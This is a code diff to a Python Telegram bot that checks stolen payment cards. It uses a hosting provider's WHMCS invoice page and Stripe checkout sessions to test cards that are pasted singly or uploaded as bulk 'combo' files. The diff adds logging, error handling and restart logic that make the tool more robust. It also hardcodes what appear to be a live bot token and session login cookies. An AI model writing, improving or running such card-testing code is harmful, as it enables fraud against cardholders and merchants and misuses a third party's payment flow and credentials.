@@ -5,12 +5,17 @@ import re
 import requests
 import urllib3
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import logging
+import sys
+
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Telegram Bot Token
 TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
-bot = telebot.TeleBot(TOKEN)
+bot = telebot.TeleBot(TOKEN, threaded=False)  # Disable threaded polling to prevent conflicts
 
 # Invoice and Cookies
 INVOICE_ID = "260528"
@@ -24,7 +29,7 @@ cookies = {
     'WHMCSqCgI4rzA0cru': 'go71bn8nc22avq11bk86rfcmon',
     'WHMCSlogin_auth_tk': 'R1BSNk1nZlBUYTZ0SzM2Z216Wm5wcVNlaUs1Y1BPRUk2RU54b0xJdVdtRzJyNUY4Uk9EajVLL0ZXTHUwRkRyNk44QWhvVHpVOHBKbTQwVE92UmxUTDlXaUR1SWJvQ3hnN3RONEl3VXFONWN1VEZOSFEycEtkMGlZZVRvZWZtbkZIbjlZTjI0NmNLbC9XbWJ4clliYllJejV4YThKTC9RMWZveld3Tm1UMHMxT3daalcrd296c1QxTVk1M3BTSHR0SzJhcmo4Z3hDSWZvVGx6QUZkV3E1QnFDbndHcEg4MXJrSGdwcnQ3WElwYWZnbkZBRVNoRnFvYnhOdE84WU1vd09sVUd0cjd4akJjdW54REVGVUNJcXNrQk5OMU50eWJWS3JMY1AwTm5LbmZHbmMwdEdMdTU3TDZ6cytWOERoczlRZ3BYbmNQaEJ5bUpYcnI3emd1OXhnZGxJVTV0TWV6dnRPRmxESjdDV1QxSWNZeFowMDFGcXlKelBmTXVQK0JuZkNsZHR5R2orNittMGNHeTF2V2tPWUtwUHVKNWxrZVVaSnFzUUE9PQ%3D%3D',
     'VsysFirstVisit': '1761307789',
-    '_ga_248YG9EFT7': 'GS2.1.s1761317576$o6$g1$t1761318687$j60$l0$h31096134',
+    '_ga_248YG9EFT7': 'GS2.1.s1761314871$o5$g1$t1761314878$j53$l0$h484498076',
 }
 
 # Dashboard counters
@@ -51,16 +56,23 @@ def get_session_data():
         session.post(f'https://vsys.host/index.php?rp=/invoice/{INVOICE_ID}/pay', 
                     data=data, cookies=cookies, verify=False, timeout=10)
     except requests.exceptions.ConnectTimeout:
+        logging.error("Connection timeout on session post")
         return None, None, None
-    except:
-        pass
+    except Exception as e:
+        logging.error(f"Session post error: {str(e)[:50]}")
+        return None, None, None
     try:
         resp = session.get(f'https://vsys.host/viewinvoice.php?id={INVOICE_ID}', 
                           cookies=cookies, verify=False, timeout=10)
     except requests.exceptions.ConnectTimeout:
+        logging.error("Connection timeout on session get")
+        return None, None, None
+    except Exception as e:
+        logging.error(f"Session get error: {str(e)[:50]}")
         return None, None, None
     m = re.search(r'https://checkout\.stripe\.com/[^\s\'"]+', resp.text)
     if not m or '/pay/' not in m.group(0):
+        logging.error("Failed to extract session ID")
         return None, None, None
     session_id = m.group(0).split('/pay/')[1].split('#')[0]
     new_cookies = session.cookies.get_dict()
@@ -74,6 +86,10 @@ def get_session_data():
             new_cookies2 = resp2.cookies.get_dict()
             stripe_sid = new_cookies2.get('__stripe_sid', '')
         except requests.exceptions.ConnectTimeout:
+            logging.error("Connection timeout on retry session get")
+            return None, None, None
+        except Exception as e:
+            logging.error(f"Retry session get error: {str(e)[:50]}")
             return None, None, None
     return session_id, stripe_mid, stripe_sid
 
@@ -201,6 +217,7 @@ def check_card(card, index):
     except Exception as e:
         results[index] = f"❌ {str(e)[:30]}"
         dashboard["error"] += 1
+        logging.error(f"Card check error: {str(e)[:50]}")
 
 def update_dashboard(chat_id, message_id):
     global last_dashboard_text
@@ -218,7 +235,15 @@ def update_dashboard(chat_id, message_id):
             last_dashboard_text = text
         except telebot.apihelper.ApiTelegramException as e:
             if "message is not modified" not in str(e):
-                raise e
+                logging.error(f"Dashboard update error: {str(e)}")
+                if "Bad Request" in str(e):
+                    bot.send_message(chat_id, "Error updating dashboard, retrying...")
+                    time.sleep(1)
+                    try:
+                        bot.edit_message_text(text, chat_id, message_id, reply_markup=keyboard)
+                        last_dashboard_text = text
+                    except Exception as retry_e:
+                        logging.error(f"Retry dashboard update error: {str(retry_e)}")
 
 @bot.message_handler(commands=['start'])
 def start(message):
@@ -239,6 +264,7 @@ def callback_query(call):
     elif call.data == "stop":
         stop_checking = True
         bot.answer_callback_query(call.id, "Checking stopped")
+        bot.send_message(call.message.chat.id, "🛑 Checking stopped.")
 
 def process_single_card(message):
     global checking, cards, results, current_message_id, last_dashboard_text
@@ -246,11 +272,16 @@ def process_single_card(message):
         bot.reply_to(message, "Checking in progress, please wait.")
         return
     checking = True
-    cards = [message.text]
+    cards = [message.text.strip()]
     results = [None]
     last_dashboard_text = ""
-    current_message_id = bot.send_message(message.chat.id, "📊 Dashboard\nStarting check...")
-    threading.Thread(target=check_cards, args=(message.chat.id, current_message_id.message_id)).start()
+    try:
+        current_message_id = bot.send_message(message.chat.id, "📊 Dashboard\nStarting check...")
+        threading.Thread(target=check_cards, args=(message.chat.id, current_message_id.message_id)).start()
+    except Exception as e:
+        logging.error(f"Error starting single card check: {str(e)}")
+        bot.reply_to(message, "Error starting check, please try again.")
+        checking = False
 
 def process_combo_file(message):
     global checking, cards, results, current_message_id, last_dashboard_text
@@ -270,6 +301,7 @@ def process_combo_file(message):
         current_message_id = bot.send_message(message.chat.id, "📊 Dashboard\nStarting check...")
         threading.Thread(target=check_cards, args=(message.chat.id, current_message_id.message_id)).start()
     except Exception as e:
+        logging.error(f"Error processing file: {str(e)}")
         bot.reply_to(message, f"Error processing file: {str(e)[:50]}")
         checking = False
 
@@ -294,4 +326,10 @@ def check_cards(chat_id, message_id):
     checking = False
     bot.send_message(chat_id, "✅ Checking completed.")
 
-bot.polling()
+if __name__ == "__main__":
+    try:
+        bot.polling(none_stop=True, interval=0, timeout=20)
+    except Exception as e:
+        logging.error(f"Polling error: {str(e)}")
+        time.sleep(5)  # Wait before restarting
+        bot.polling(none_stop=True, interval=0, timeout=20)
